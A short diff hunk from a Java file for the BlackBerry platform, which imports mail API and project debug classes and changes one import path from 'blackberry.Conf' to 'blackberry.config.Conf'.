@@ -12,7 +12,7 @@ import net.rim.blackberry.api.mail.TextBodyPart;
 import net.rim.blackberry.api.mail.Transport;
 import net.rim.blackberry.api.mail.UnsupportedAttachmentPart;
 import net.rim.blackberry.api.mail.BodyPart.ContentType;
-import blackberry.Conf;
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.utils.Check;
